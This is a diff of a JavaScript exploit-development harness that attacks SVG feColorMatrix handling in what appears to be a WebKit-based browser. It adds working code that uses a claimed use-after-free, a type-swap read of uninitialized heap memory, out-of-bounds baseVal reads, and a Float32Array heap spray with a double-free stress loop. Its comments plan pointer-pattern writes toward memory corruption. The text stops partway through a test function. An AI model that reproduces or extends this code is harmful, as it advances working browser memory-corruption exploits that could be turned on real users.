+ *    f16(4352) = 0x4C40. f16(4353) rounds to f16(4352) since ULP=4 in that range.
+ *    f16(4356) is the next representable value.
+ * C) Map ALL flip zones from 1 to 65504 (full f16 range).
+ *    This gives the complete oracle lookup table.
+ * D) Different source R values vs matrix values: map the 2D function.
+ *    R_in=64 at mv=1e4 gives R=255. R_in=1 at mv=1e4 gives R=0.
+ *    Find the exact boundary in R_in at mv=1e4.
  */
-async function runMXN(q) {
-  if (!q) { dis(true); sep(); log('MXN: narrow feColorMatrix flip points via binary search', 'inf'); sep(); }
+async function runF16(q) {
+  if (!q) { dis(true); sep(); log('F16: float16 oracle mapping', 'inf'); sep(); }
 
-  function makeBakedColorMatrix(val00) {
-    var mat = val00 + ' 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0';
+  function svgFCM(mv, fill) {
+    var mat = mv + ' 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0';
     return '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">' +
       '<defs><filter id="f" color-interpolation-filters="sRGB">' +
         '<feColorMatrix type="matrix" values="' + mat + '"/>' +
       '</filter></defs>' +
-      '<rect x="50" y="50" width="100" height="100" fill="rgb(200,100,50)" filter="url(#f)"/>' +
+      '<rect x="50" y="50" width="100" height="100" fill="' + (fill || 'rgb(200,100,50)') + '" filter="url(#f)"/>' +
     '</svg>';
   }
-
-  async function getR(val) {
-    var px = await svgPixelFromStr(makeBakedColorMatrix(val));
+  async function R(mv, fill) {
+    var px = await svgPixel(svgFCM(mv, fill), 100, 100);
     return px ? px[0] : -1;
   }
 
-  // Phase 1: dense sweep 1e3..1e4 to find flip
-  log('  phase1: dense sweep 1000..10000 (step x1.5)', 'inf');
-  var v = 1000;
-  var lastR = await getR(v);
-  log('  ' + v.toFixed(0) + ' R=' + lastR, 'dim');
-  while (v < 10000) {
-    var vNext = Math.min(v * 1.5, 10000);
-    if (vNext === v) break;
-    v = vNext;
-    var R = await getR(v);
-    var flip = (lastR === 0 && R === 255) || (lastR === 255 && R === 0);
-    log('  ' + v.toFixed(0) + ' R=' + R + (flip ? ' [FLIP]' : ''), flip ? 'bad' : 'dim');
-    lastR = R;
+  // Test A: map transitions from 1 to 100000
+  log('  TestA: map all R transitions 1..100000 (log scale)', 'inf');
+  var probePoints = [];
+  for (var exp = 0; exp <= 5; exp++) {
+    var base = Math.pow(10, exp);
+    for (var m = 1; m <= 9; m++) {
+      probePoints.push(base * m);
+    }
+  }
+  // Also add known boundary-adjacent points
+  probePoints = probePoints.concat([4348, 4350, 4352, 4354, 4356, 21880, 21884, 21888, 21892, 21896]);
+  probePoints.sort(function(a,b){return a-b;});
+
+  var lastR = -1; var transitions = [];
+  for (var i = 0; i < probePoints.length; i++) {
+    var mv = probePoints[i];
+    var r = await R(mv);
+    var flip = (lastR >= 0 && lastR !== r);
+    if (flip) transitions.push({ from: probePoints[i-1], to: mv, fromR: lastR, toR: r });
+    log('  mv=' + mv + ' R=' + r + (flip ? ' [TRANSITION from ' + lastR + ']' : ''), flip ? 'bad' : 'dim');
+    lastR = r;
+  }
+  log('  transitions found: ' + transitions.length, 'inf');
+  for (var ti = 0; ti < transitions.length; ti++) {
+    var t = transitions[ti];
+    log('  T' + ti + ': ' + t.from + '(R=' + t.fromR + ') -> ' + t.to + '(R=' + t.toR + ')', 'bad');
   }
 
-  // Phase 2: binary search 1e3..1e4 for exact boundary
-  log('  phase2: binary search for exact 0->255 boundary in [1000, 10000]', 'inf');
-  var lo = 1000; var hi = 10000; var iterations = 0;
-  var rLo = await getR(lo); var rHi = await getR(hi);
-  log('  lo=' + lo + ' R=' + rLo + '  hi=' + hi + ' R=' + rHi, 'inf');
-
-  if (rLo !== rHi) {
-    while (hi - lo > 1 && iterations < 20) {
-      var mid = (lo + hi) / 2;
-      var rMid = await getR(mid);
-      log('  mid=' + mid.toFixed(2) + ' R=' + rMid, 'dim');
-      if (rMid === rLo) { lo = mid; rLo = rMid; }
-      else { hi = mid; rHi = rMid; }
-      iterations++;
-    }
-    log('  FLIP BOUNDARY: ' + lo.toFixed(2) + ' (R=' + rLo + ') -> ' + hi.toFixed(2) + ' (R=' + rHi + ')', 'bad');
-    log('  boundary value: ~' + ((lo + hi) / 2).toFixed(2), 'bad');
-    log('  as hex: 0x' + Math.round((lo + hi) / 2).toString(16), 'bad');
-    log('  as power of 2: 2^' + Math.log2((lo + hi) / 2).toFixed(3), 'bad');
-  } else {
-    log('  lo and hi have same R=' + rLo + ' — no flip in this range', 'inf');
+  // Test B: float16 math verification
+  // ULP at value V (half precision): ULP = 2^(floor(log2(V)) - 10)
+  log('  TestB: float16 ULP verification at key boundaries', 'inf');
+  var f16Boundaries = [1024, 2048, 4096, 8192, 16384, 32768];
+  for (var bi = 0; bi < f16Boundaries.length; bi++) {
+    var bv = f16Boundaries[bi];
+    var ulp = bv / 1024; // ULP = 2^(exp-10), bv = 2^exp -> ULP = 2^(exp-10) = 2^exp / 1024
+    var r1 = await R(bv - ulp);
+    var r2 = await R(bv);
+    var r3 = await R(bv + ulp);
+    log('  f16 boundary ' + bv + ' (ULP=' + ulp + '): [' + (bv-ulp) + ']R=' + r1 +
+        ' [' + bv + ']R=' + r2 + ' [' + (bv+ulp) + ']R=' + r3,
+        (r1 !== r2 || r2 !== r3) ? 'bad' : 'dim');
   }
 
-  // Phase 3: binary search in [1e4, 1e5] for next flip (255->0)
-  log('  phase3: binary search for 255->0 boundary in [1e4, 1e5]', 'inf');
-  var lo2 = 1e4; var hi2 = 1e5; var iter2 = 0;
-  var rLo2 = await getR(lo2); var rHi2 = await getR(hi2);
-  log('  lo=' + lo2.toExponential(1) + ' R=' + rLo2 + '  hi=' + hi2.toExponential(1) + ' R=' + rHi2, 'inf');
-  if (rLo2 !== rHi2) {
-    while (hi2 - lo2 > 1 && iter2 < 20) {
-      var mid2 = (lo2 + hi2) / 2;
-      var rMid2 = await getR(mid2);
-      log('  mid=' + mid2.toFixed(0) + ' R=' + rMid2, 'dim');
-      if (rMid2 === rLo2) { lo2 = mid2; rLo2 = rMid2; }
-      else { hi2 = mid2; rHi2 = rMid2; }
-      iter2++;
+  // Test C: source R value sweep at the known boundary matrix values
+  log('  TestC: source R sweep at matrix boundary values', 'inf');
+  var boundaryMvs = [4352, 21888, 100000];
+  for (var bmi = 0; bmi < boundaryMvs.length; bmi++) {
+    var bmv = boundaryMvs[bmi];
+    var srcVals = [1, 2, 4, 8, 16, 32, 48, 56, 60, 62, 63, 64, 65, 66, 68, 72, 80, 96, 128, 200, 255];
+    for (var si = 0; si < srcVals.length; si++) {
+      var sv = srcVals[si];
+      var fillStr = 'rgb(' + sv + ',0,0)';
+      var ro = await R(bmv, fillStr);
+      log('  mv=' + bmv + ' src.R=' + sv + ' -> out.R=' + ro, ro > 0 && ro < 255 ? 'bad' : 'dim');
     }
-    log('  FLIP BOUNDARY: ' + lo2.toFixed(0) + ' -> ' + hi2.toFixed(0), 'bad');
-    log('  boundary value: ~' + Math.round((lo2 + hi2) / 2), 'bad');
-    log('  as hex: 0x' + Math.round((lo2 + hi2) / 2).toString(16), 'bad');
-    log('  as power of 2: 2^' + Math.log2((lo2 + hi2) / 2).toFixed(3), 'bad');
-  } else {
-    log('  same R on both ends — no flip in [1e4, 1e5]', 'inf');
   }
 
-  // Phase 4: different source colors at flip-adjacent values
-  log('  phase4: different fill colors at matrix[0,0]=1e3 vs 1e4 (int overflow hypothesis)', 'inf');
-  var flipAdj = [1e3, 1e4];
-  var testColors = ['rgb(1,0,0)', 'rgb(64,0,0)', 'rgb(128,0,0)', 'rgb(200,0,0)', 'rgb(255,0,0)'];
-  for (var fi = 0; fi < flipAdj.length; fi++) {
-    var mv = flipAdj[fi];
-    for (var ci = 0; ci < testColors.length; ci++) {
-      var col = testColors[ci];
-      var rVal = parseInt(col.match(/\d+/)[0]);
-      var svgStr = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">' +
-        '<defs><filter id="f" color-interpolation-filters="sRGB">' +
-          '<feColorMatrix type="matrix" values="' + mv + ' 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0"/>' +
-        '</filter></defs>' +
-        '<rect x="50" y="50" width="100" height="100" fill="' + col + '" filter="url(#f)"/>' +
-      '</svg>';
-      var px = await svgPixelFromStr(svgStr);
-      var R = px ? px[0] : -1;
-      log('  mv=' + mv.toExponential(0) + ' fill.R=' + rVal + ' -> out.R=' + R, R > 0 && R < 255 ? 'bad' : 'dim');
-    }
+  // Test D: float16 oracle - given an UNKNOWN value that would come from heap memory,
+  // what output range do we expect?
+  // Strategy: feColorMatrix with matrix[0,0]=X, output is a function of f16(X).
+  // If we could place arbitrary floats at &fcm->m_values[0], we'd read f16 from the heap.
+  // For now: verify oracle resolution. What's the smallest delta we can distinguish?
+  log('  TestD: oracle resolution - smallest distinguishable delta', 'inf');
+  var oracleBase = 4352;
+  var deltas = [0.01, 0.1, 0.25, 0.5, 1, 2, 4, 8];
+  var rBase = await R(oracleBase);
+  for (var di = 0; di < deltas.length; di++) {
+    var delta = deltas[di];
+    var rPlus = await R(oracleBase + delta);
+    var rMinus = await R(oracleBase - delta);
+    log('  base=' + oracleBase + '(R=' + rBase + ') +/-' + delta +
+        ': (' + rMinus + ',' + rPlus + ')' +
+        ((rPlus !== rBase || rMinus !== rBase) ? ' DISTINGUISHABLE' : ''), 'dim');
   }
 
   if (!q) dis(false);
 }
 
 /*
- * CMB: Combined UAF + controlled output
+ * TSH: Type-Swap Heap read
  *
- * Using knowledge from UFV (UAF feeds rasterizer) and MXN (flip boundaries):
- * Write specific values to baseVal[0] via UAF that produce PREDICTABLE output.
- * Goal: show that UAF gives arbitrary control over the feColorMatrix rasterizer output.
+ * v32 TSV finding: hueRotate->matrix type-swap leaves values.baseVal.length=1.
+ * C++ code for type=matrix reads 20 floats (m_values[0..19]).
+ * But m_values has only 1 element set. Elements [1..19] are uninitialized or come
+ * from adjacent heap memory.
  *
- * If UAF can write arbitrary floats and the rasterizer is a deterministic function of them,
- * then UAF = controlled rasterizer output.
+ * OBSERVATION STRATEGY:
+ * If any of m_values[1..19] are non-zero (adjacent heap memory), the matrix output
+ * would differ from pure-zero-off-diagonal behavior.
  *
- * From MXN, we'll have exact boundary values.
- * Use those to write values that produce specific R outputs:
- *   write V just below lower boundary -> R=0
- *   write V in [lower, upper] -> R=255
- *   write V above upper -> R=0 or 255 (alternating)
+ * For a 4x5 matrix:
+ *   row0: [0,0]=hueAngle, [0,1..4]=heap[1..4]  -> R_out = hueAngle*R + heap[1]*G + heap[2]*B + heap[3]*A + heap[4]
+ *   row1: [1,0..4]=heap[5..9]  -> G_out = heap[5]*R + heap[6]*G + heap[7]*B + ...
+ *   row2: [2,0..4]=heap[10..14] -> B_out = ...
+ *   row3: [3,0..4]=heap[15..19] -> A_out = ...
  *
- * ALSO: multi-channel control test.
- * Can we independently control R, G, B output via UAF?
- *   baseVal[0] = R scale (matrix[0,0]) -> controls R channel out
- *   baseVal[6] = G scale (matrix[1,1]) -> controls G channel out
- *   baseVal[12] = B scale (matrix[2,2]) -> controls B channel out
- * Write each independently. Observe if channels respond independently.
- * If yes: we have 3-channel arbitrary pixel output via UAF.
+ * If heap bytes adjacent to m_values[0] contain non-zero floats, we'd see non-zero
+ * output for G, B channels. Specifically, [1,0]=heap[5] would show as:
+ *   G_out += heap[5] * R_in = heap[5] * (200/255)
+ *   If heap[5] > 0: G_out > 0.
+ *
+ * TEST: do many type-swaps with different initial hueRotate values.
+ * Different angles = different C++ object sizes or alignments = different adjacent memory.
+ * Look for any non-zero G or B output.
+ *
+ * ALSO: test with many GC cycles before type-swap to force different heap layouts.
  */
-async function runCMB(q) {
-  if (!q) { dis(true); sep(); log('CMB: combined UAF controlled output + multi-channel', 'inf'); sep(); }
+async function runTSH(q) {
+  if (!q) { dis(true); sep(); log('TSH: type-swap heap read via uninitialized matrix values', 'inf'); sep(); }
 
-  var ID = '1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0';
-
-  // Multi-channel independent control test
-  log('  multi-channel UAF: write R/G/B scales independently', 'inf');
-
-  var channelTests = [
-    // Each entry: [baseVal_R_idx, R_val, baseVal_G_idx, G_val, baseVal_B_idx, B_val, expected_note]
-    // Identity test
-    { r: 0, rv: 1,   g: 6, gv: 1,   b: 12, bv: 1,   note: 'identity (all=1)' },
-    // Scale only R up (expect R=255, G/B unchanged)
-    { r: 0, rv: 2,   g: 6, gv: 1,   b: 12, bv: 1,   note: 'R=2 (expect R=255, G=99, B=50)' },
-    // Scale only G up
-    { r: 0, rv: 1,   g: 6, gv: 2,   b: 12, bv: 1,   note: 'G=2 (expect R=200, G=255, B=50)' },
-    // Scale only B up
-    { r: 0, rv: 1,   g: 6, gv: 1,   b: 12, bv: 2,   note: 'B=2 (expect R=200, G=99, B=255)' },
-    // All to 2
-    { r: 0, rv: 2,   g: 6, gv: 2,   b: 12, bv: 2,   note: 'all=2 (expect all 255)' },
-    // R=0, G=2, B=0 (zero R and B)
-    { r: 0, rv: 0,   g: 6, gv: 2,   b: 12, bv: 0,   note: 'R=0,G=2,B=0 (expect R=0,G=255,B=0)' },
-    // Target pixel: R=100, G=50, B=200 (write scale factors to produce this)
-    // Input is (200, 100, 50). For output (100, 50, 200):
-    //   R_scale = 100 / 200 = 0.5 -> baseVal[0]=0.5
-    //   G_scale = 50 / 100 = 0.5 -> baseVal[6]=0.5
-    //   B_scale = 200 / 50 = 4.0 -> baseVal[12]=4.0
-    { r: 0, rv: 0.5, g: 6, gv: 0.5, b: 12, bv: 4.0, note: 'target (100,50,200): R=0.5 G=0.5 B=4' },
-    // Overflow test: R=1e3 (known zero), G=1e4 (known 255), B=1 (pass)
-    { r: 0, rv: 1e3, g: 6, gv: 1e4, b: 12, bv: 1,   note: 'R=1e3(->0) G=1e4(->255) B=1(->50)' }
-  ];
-
-  for (var ti = 0; ti < channelTests.length; ti++) {
-    var ct = channelTests[ti];
-    var dom = await buildLiveFCM(ID);
-    dom.fcm.remove(); await raf();
-    try {
-      dom.fcm.values.baseVal[ct.r].value = ct.rv;
-      dom.fcm.values.baseVal[ct.g].value = ct.gv;
-      dom.fcm.values.baseVal[ct.b].value = ct.bv;
-    } catch(e) { log('  write error: ' + e, 'bad'); }
-    dom.filter.appendChild(dom.fcm); await raf(); await raf();
-    var px = await readPixelFromLive(dom.svg);
-    log('  ' + ct.note + ': px=' + (px ? px.slice(0,3) : 'err'), 'inf');
-    document.body.removeChild(dom.svg);
-  }
-
-  // SMIL animation + UAF interaction
-  log('  SMIL+UAF: animate values, UAF write during animation', 'inf');
-  {
-    var outerS = document.createElementNS(SVG_NS, 'svg');
-    outerS.setAttribute('width', '200'); outerS.setAttribute('height', '200');
-    outerS.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
-    var defsS = document.createElementNS(SVG_NS, 'defs');
-    var filterS = document.createElementNS(SVG_NS, 'filter');
-    filterS.setAttribute('id', 'v32fS');
-    filterS.setAttribute('color-interpolation-filters', 'sRGB');
-    var fcmS = document.createElementNS(SVG_NS, 'feColorMatrix');
-    fcmS.setAttribute('type', 'matrix');
-    fcmS.setAttribute('values', ID);
-
-    // Add SMIL animate for the values
-    var anim = document.createElementNS(SVG_NS, 'animate');
-    anim.setAttribute('attributeName', 'values');
-    anim.setAttribute('from', ID);
-    anim.setAttribute('to', '1e38 0 0 0 0  0 1e38 0 0 0  0 0 1e38 0 0  0 0 0 1 0');
-    anim.setAttribute('dur', '10s');
-    anim.setAttribute('fill', 'freeze');
-    anim.setAttribute('begin', '0s');
-    fcmS.appendChild(anim);
-
-    filterS.appendChild(fcmS); defsS.appendChild(filterS); outerS.appendChild(defsS);
-    var rectS = document.createElementNS(SVG_NS, 'rect');
-    rectS.setAttribute('x', '50'); rectS.setAttribute('y', '50');
-    rectS.setAttribute('width', '100'); rectS.setAttribute('height', '100');
-    rectS.setAttribute('fill', 'rgb(200,100,50)');
-    rectS.setAttribute('filter', 'url(#v32fS)');
-    outerS.appendChild(rectS);
-    document.body.appendChild(outerS);
+  async function typeSwapMatrix(hueAngle, doGC) {
+    var outerSvg = document.createElementNS(SVG_NS, 'svg');
+    outerSvg.setAttribute('width', '200'); outerSvg.setAttribute('height', '200');
+    outerSvg.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
+    var defs = document.createElementNS(SVG_NS, 'defs');
+    var filter = document.createElementNS(SVG_NS, 'filter');
+    filter.setAttribute('id', 'fTSH'); filter.setAttribute('color-interpolation-filters', 'sRGB');
+    var fcm = document.createElementNS(SVG_NS, 'feColorMatrix');
+    fcm.setAttribute('type', 'hueRotate'); fcm.setAttribute('values', String(hueAngle));
+    filter.appendChild(fcm); defs.appendChild(filter); outerSvg.appendChild(defs);
+    var rect = document.createElementNS(SVG_NS, 'rect');
+    rect.setAttribute('x', '50'); rect.setAttribute('y', '50');
+    rect.setAttribute('width', '100'); rect.setAttribute('height', '100');
+    rect.setAttribute('fill', 'rgb(200,100,50)');
+    rect.setAttribute('filter', 'url(#fTSH)');
+    outerSvg.appendChild(rect);
+    document.body.appendChild(outerSvg);
     await raf(); await raf();
 
-    // Immediately UAF write (animation running)
-    fcmS.remove(); await raf();
-    var writeS = false;
-    try {
-      fcmS.values.baseVal[0].value = 2;
-      writeS = true;
-    } catch(e) {}
-    filterS.appendChild(fcmS); await raf(); await raf();
+    if (doGC) {
+      // Spray and collect to perturb heap layout
+      var garbage = [];
+      for (var gi = 0; gi < 1000; gi++) garbage.push(new Float32Array(20));
+      garbage = null;
+      await raf();
+    }
 
-    var pxS = await readPixelFromLive(outerS);
-    log('  SMIL+UAF write=2 during animation: px=' + (pxS ? pxS.slice(0,3) : 'err') + ' writeOk=' + writeS,
-        pxS && pxS[0] === 255 ? 'ok' : 'inf');
-    document.body.removeChild(outerS);
+    // UAF write to change hue angle
+    fcm.remove(); await raf();
+    var wrote = null;
+    try {
+      fcm.values.baseVal[0].value = hueAngle; // write same value back (no corruption intent)
+      wrote = fcm.values.baseVal[0].value;
+    } catch(e) { wrote = 'ERR'; }
+
+    // Type-swap on detached element
+    fcm.setAttribute('type', 'matrix');
+    // Do NOT set values attribute — let C++ use whatever m_values has
+    filter.appendChild(fcm); await raf(); await raf();
+
+    var svgStr = new XMLSerializer().serializeToString(outerSvg);
+    var blob = new Blob([svgStr], { type: 'image/svg+xml' });
+    var url = URL.createObjectURL(blob);
+    var img = new Image();
+    var px = await new Promise(function(resolve) {
+      img.onload = function() {
+        try {
+          var cc = getCanvas();
+          cc.ctx.clearRect(0, 0, 200, 200);
+          cc.ctx.drawImage(img, 0, 0);
+          var d = cc.ctx.getImageData(100, 100, 1, 1);
+          resolve([d.data[0], d.data[1], d.data[2], d.data[3]]);
+        } catch(e) { resolve(null); }
+      };
+      img.onerror = function() { resolve(null); };
+      img.src = url;
+      setTimeout(function() { resolve(null); }, 2000);
+    });
+    URL.revokeObjectURL(url);
+    document.body.removeChild(outerSvg);
+    return { px: px, wrote: wrote };
+  }
+
+  // Phase 1: basic type-swap at various hue angles
+  log('  phase1: type-swap at various hue angles, look for non-zero G/B', 'inf');
+  var hueAngles = [0, 45, 90, 135, 180, 225, 270, 315, 360, 720, 1e5, 1e10];
+  for (var hi = 0; hi < hueAngles.length; hi++) {
+    var ha = hueAngles[hi];
+    var res = await typeSwapMatrix(ha, false);
+    var px = res.px;
+    var nonZero = px && (px[0] > 0 || px[1] > 0 || px[2] > 0);
+    log('  hue=' + ha + ': px=' + (px ? px.slice(0,3) : 'err') +
+        (nonZero ? ' [NON-ZERO! possible heap read]' : ''), nonZero ? 'bad' : 'dim');
+  }
+
+  // Phase 2: same with GC spray to change heap layout
+  log('  phase2: with GC spray before type-swap', 'inf');
+  for (var hi2 = 0; hi2 < hueAngles.length; hi2++) {
+    var ha2 = hueAngles[hi2];
+    var res2 = await typeSwapMatrix(ha2, true);
+    var px2 = res2.px;
+    var nonZero2 = px2 && (px2[0] > 0 || px2[1] > 0 || px2[2] > 0);
+    log('  [GC] hue=' + ha2 + ': px=' + (px2 ? px2.slice(0,3) : 'err') +
+        (nonZero2 ? ' [NON-ZERO!]' : ''), nonZero2 ? 'bad' : 'dim');
+  }
+
+  // Phase 3: read back baseVal after type-swap (how many elements visible?)
+  log('  phase3: inspect baseVal length and values after type-swap', 'inf');
+  {
+    var outerP = document.createElementNS(SVG_NS, 'svg');
+    outerP.setAttribute('width', '200'); outerP.setAttribute('height', '200');
+    outerP.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
+    var defsP = document.createElementNS(SVG_NS, 'defs');
+    var filterP = document.createElementNS(SVG_NS, 'filter');
+    filterP.setAttribute('id', 'fP'); filterP.setAttribute('color-interpolation-filters', 'sRGB');
+    var fcmP = document.createElementNS(SVG_NS, 'feColorMatrix');
+    fcmP.setAttribute('type', 'hueRotate'); fcmP.setAttribute('values', '180');
+    filterP.appendChild(fcmP); defsP.appendChild(filterP); outerP.appendChild(defsP);
+    var rectP = document.createElementNS(SVG_NS, 'rect');
+    rectP.setAttribute('x', '50'); rectP.setAttribute('y', '50');
+    rectP.setAttribute('width', '100'); rectP.setAttribute('height', '100');
+    rectP.setAttribute('fill', 'rgb(200,100,50)');
+    rectP.setAttribute('filter', 'url(#fP)');
+    outerP.appendChild(rectP);
+    document.body.appendChild(outerP);
+    await raf(); await raf();
+
+    // Type-swap without remove (live element!)
+    log('  type-swap on LIVE element (no remove/re-add)', 'inf');
+    fcmP.setAttribute('type', 'matrix');
+    await raf(); await raf();
+    var lenAfter = -1;
+    try { lenAfter = fcmP.values.baseVal.length; } catch(e) {}
+    log('  after live type-swap: values.baseVal.length=' + lenAfter, 'inf');
+
+    // Read all accessible baseVal elements
+    var readVals = [];
+    try {
+      for (var ri = 0; ri < lenAfter; ri++) {
+        readVals.push(fcmP.values.baseVal[ri].value);
+      }
+    } catch(e3) { log('  read error: ' + e3, 'bad'); }
+    log('  baseVal values: ' + JSON.stringify(readVals), 'inf');
+
+    var pxP = await readLive(outerP);
+    log('  live type-swap pixel: ' + (pxP ? pxP.slice(0,3) : 'err'), 'inf');
+
+    // Now try reading beyond length via manual index
+    log('  try reading beyond .length (OOB access):', 'inf');
+    var oobVals = [];
+    for (var oi = lenAfter; oi < lenAfter + 10; oi++) {
+      var v = null;
+      try {
+        var item = fcmP.values.baseVal[oi];
+        if (item != null) v = item.value;
+      } catch(e4) { v = 'ERR'; }
+      oobVals.push('[' + oi + ']=' + v);
+    }
+    log('  OOB reads: ' + oobVals.join(' '), 'inf');
+
+    document.body.removeChild(outerP);
   }
 
   if (!q) dis(false);
 }
 
-// RUN ALL
+/*
+ * PRM: Pure Memory Corruption
+ *
+ * v32: every UAF write + re-add = R=0 (corrupted).
+ * NEW ANGLE: DON'T re-add. Use the UAF write as PURE CORRUPTION.
+ *
+ * The SVGNumber C++ object has (approximately):
+ *   struct SVGNumber : SVGPropertyBase {
+ *     float m_value;          // offset +0 (what we write)
+ *     RefPtr<owner> m_owner;  // offset +8 or +4 (pointer to SVGAnimatedNumberList)
+ *     // ... other RefPtr fields
+ *   };
+ *
+ * When we write via baseVal[0].value = X:
+ *   - Sets m_value = float(X)
+ *   - Calls notifyChange() -> dereferences m_owner
+ *   - m_owner is valid pointer (object still alive via strong ref from m_values list)
+ *   - So notifyChange SUCCEEDS but walks owner chain through detached element
+ *   - This is NOT crashing — it's just invalidating the render state
+ *
+ * CORRUPTION EXPERIMENT:
+ * A) Write to indices [0..19] SIMULTANEOUSLY and observe crash patterns.
+ *    If any write to a specific index causes a CRASH: that index overlaps a pointer.
+ * B) Write specific float bit patterns that look like pointers:
+ *    0x41414141 as float = 12.0787...
+ *    0x00000000 as float = 0.0 -> NULL ptr
+ *    Write 0 to each index and see if any causes a null-ptr crash.
+ * C) Free-after-free: create TWO SVGNumber objects sharing the same underlying C++ memory
+ *    via two separate remove+write cycles. This could double-free.
+ * D) Spray Float32Arrays of specific sizes to fill the IsoHeap holes
+ *    left by freed SVGNumber objects. Then UAF write should overwrite the spray.
+ */
+async function runPRM(q) {
+  if (!q) { dis(true); sep(); log('PRM: pure memory corruption patterns', 'inf'); sep(); }
+
+  var ID = '1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0';
+
+  // Test A: write 0 to each baseVal index, observe crash
+  log('  TestA: write 0.0 to each of 20 indices, check for crash', 'inf');
+  {
+    var eA = makeSVGShell('fPRM_A');
+    var fcmA = document.createElementNS(SVG_NS, 'feColorMatrix');
+    fcmA.setAttribute('type', 'matrix'); fcmA.setAttribute('values', ID);
+    eA.filter.appendChild(fcmA);
+    document.body.appendChild(eA.svg); await raf(); await raf();
+
+    var valsA = fcmA.values;
+    fcmA.remove(); await raf();
+
+    var writeResults = [];
+    for (var ai = 0; ai < 20; ai++) {
+      try {
+        valsA.baseVal[ai].value = 0;
+        writeResults.push(ai + ':ok');
+      } catch(e) { writeResults.push(ai + ':ERR(' + e.message + ')'); }
+    }
+    log('  write results: ' + writeResults.join(' '), 'inf');
+    await raf();
+    log('  survived 20 writes (no crash)', 'ok');
+    document.body.removeChild(eA.svg);
+  }
+
+  // Test B: write specific bit patterns as float
+  log('  TestB: write specific float bit patterns', 'inf');
+  {
+    var eB = makeSVGShell('fPRM_B');
+    var fcmB = document.createElementNS(SVG_NS, 'feColorMatrix');
+    fcmB.setAttribute('type', 'matrix'); fcmB.setAttribute('values', ID);
+    eB.filter.appendChild(fcmB);
+    document.body.appendChild(eB.svg); await raf(); await raf();
+    var valsB = fcmB.values;
+    fcmB.remove(); await raf();
+
+    // These floats have interesting bit patterns:
+    var patterns = [
+      { v: 0.0,          note: 'zero (null ptr as float)' },
+      { v: -0.0,         note: 'negative zero' },
+      { v: Infinity,     note: 'infinity (0x7F800000)' },
+      { v: -Infinity,    note: 'neg infinity (0xFF800000)' },
+      { v: NaN,          note: 'NaN (0x7FC00000)' },
+      { v: 1.1754944e-38, note: 'min normal float32 (0x00800000)' },
+      { v: 5.0e-324,     note: 'min JS double (denorm)' },
+      { v: 1.5e-45,      note: 'min float32 denorm (0x00000001)' },
+      { v: 3.4028235e38, note: 'max float32 (0x7F7FFFFF)' }
+    ];
+
+    for (var pi = 0; pi < patterns.length; pi++) {
+      var pat = patterns[pi];
+      var wrote = null;
+      try {
+        valsB.baseVal[0].value = pat.v;
+        wrote = valsB.baseVal[0].value;
+      } catch(e) { wrote = 'ERR'; }
+      log('  write ' + pat.note + ': wrote=' + wrote, 'dim');
+    }
+    log('  survived all pattern writes', 'ok');
+    document.body.removeChild(eB.svg);
+  }
+
+  // Test C: spray Float32Array BEFORE creating feColorMatrix, then UAF
+  // IsoHeap: Float32Array data and SVGNumber may share the same alloc size bucket
+  // Spray should fill the holes left by GC with controlled data
+  log('  TestC: heap spray Float32Array, then feColorMatrix UAF', 'inf');
+  {
+    // Step 1: allocate many Float32Arrays of size 1 (same as single float = SVGNumber m_value size?)
+    var spray = [];
+    for (var si = 0; si < 5000; si++) {
+      var f32 = new Float32Array(1);
+      f32[0] = 0xDEAD; // marker value = 57005
+      spray.push(f32);
+    }
+
+    var eC = makeSVGShell('fPRM_C');
+    var fcmC = document.createElementNS(SVG_NS, 'feColorMatrix');
+    fcmC.setAttribute('type', 'matrix'); fcmC.setAttribute('values', ID);
+    eC.filter.appendChild(fcmC);
+    document.body.appendChild(eC.svg); await raf(); await raf();
+
+    // Free half the spray -> holes in heap
+    for (var si2 = 0; si2 < 2500; si2++) spray[si2] = null;
+    await raf();
+
+    var valsC = fcmC.values;
+    fcmC.remove(); await raf();
+    // UAF write
+    try { valsC.baseVal[0].value = 12345.678; } catch(e) {}
+    // Check if any spray array got corrupted
+    var corrupted = 0;
+    for (var si3 = 2500; si3 < 5000; si3++) {
+      if (spray[si3] && spray[si3][0] !== 0xDEAD) {
+        corrupted++;
+        log('  SPRAY CORRUPTION at index ' + si3 + ': expected 57005, got ' + spray[si3][0], 'bad');
+      }
+    }
+    if (corrupted === 0) log('  no spray corruption detected (UAF write landed elsewhere)', 'ok');
+    else log('  TOTAL CORRUPTED: ' + corrupted, 'bad');
+
+    spray = null;
+    document.body.removeChild(eC.svg);
+  }
+
+  // Test D: rapid create/remove/UAF cycle — stress test for double-free
+  log('  TestD: rapid UAF cycle x100 (double-free stress)', 'inf');
+  {
+    var crashes = 0;
+    var survived = 0;
+    for (var di = 0; di < 100; di++) {
+      try {
+        var eD = makeSVGShell('fPRM_D_' + di);
+        var fcmD = document.createElementNS(SVG_NS, 'feColorMatrix');
+        fcmD.setAttribute('type', 'matrix'); fcmD.setAttribute('values', ID);
+        eD.filter.appendChild(fcmD);
+        document.body.appendChild(eD.svg);
+        var valsD = fcmD.values;
+        fcmD.remove();
+        valsD.baseVal[0].value = di * 0.1;
+        valsD.baseVal[0].value = -di * 0.1; // write twice = double notifyChange
+        document.body.removeChild(eD.svg);
+        survived++;
+      } catch(e) { crashes++; log('  crash at iteration ' + di + ': ' + e, 'bad'); }
+    }
+    log('  rapid UAF x100: survived=' + survived + ' crashes=' + crashes,
+        crashes > 0 ? 'bad' : 'ok');
+  }
+
+  // Test E: UAF write on SVGAnimatedLength (different type) to compare behavior
+  log('  TestE: compare SVGAnimatedLength UAF vs SVGAnimatedNumberList UAF', 'inf');
+  {
+    var eE = makeSVGShell('fPRM_E');
+    // Use feTurbulence which has baseFrequency as SVGAnimatedNumber
+    var turbE = document.createElementNS(SVG_NS, 'feTurbulence');
+    turbE.setAttribute('type', 'fractalNoise');
+    turbE.setAttribute('baseFrequency', '0.65');
+    turbE.setAttribute('numOctaves', '1');
+    eE.filter.appendChild(turbE);
